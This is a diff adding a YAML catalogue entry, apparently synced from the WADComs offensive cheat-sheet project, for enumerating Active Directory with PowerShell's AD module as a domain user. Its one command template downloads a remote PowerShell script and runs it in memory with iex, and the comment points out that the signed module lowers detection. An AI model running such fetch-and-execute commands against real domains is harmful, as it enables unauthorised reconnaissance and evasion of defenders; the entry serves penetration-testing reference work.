@@ -1,0 +1,27 @@
+id: wadcoms/powershell-admodule-enum
+type: technique
+platform: active-directory
+name: Powershell ADModule enum
+phases:
+- credential-access
+capabilities:
+- credential-access
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: verify upstream LICENSE
+  upstream_version: a864cd1
+  last_synced: '2026-08-25'
+commands:
+- template: iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
+  comment: The Active Directory Module from powershell can be used to preform most needed enumaration
+    tasks as well as some exploitation tasks revoling around ACL/DACL/Delegation abuse. The modules does
+    not need to be installed on the target, it is signed by microsoft and thus greatly reduc
+references:
+- https://docs.microsoft.com/en-us/powershell/module/activedirectory/
+- https://github.com/samratashok/ADModule
+- https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html
+tags:
+- active-directory
+- wadcoms
